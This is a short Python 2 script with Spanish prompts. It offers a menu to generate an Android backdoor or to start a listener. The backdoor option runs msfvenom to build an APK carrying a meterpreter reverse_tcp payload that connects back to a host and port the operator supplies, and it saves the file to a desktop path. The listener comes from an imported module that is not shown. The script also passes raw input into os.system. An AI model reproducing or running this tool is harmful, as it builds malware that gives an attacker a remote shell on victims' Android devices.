#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket
sys.path.append('core/')
from listener import *

print("""
1) BackDoor 
2) Listener

""")

choice = raw_input("Elige una opcion #~:  ")

if(choice=="1"):
	print("""

1. Backdoor Android

       """)
	bd = raw_input("Para generar backdoor presione 1? #~: ")

	if(bd=="1"):
		os.system("clear")
		os.system("ANDROID BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /home/froilan/Desktop/test.apk")
		print("(*) Backdoor generado")


if(choice=="2"):
	listener()


	 


	

		
	 
 
                         
                                          
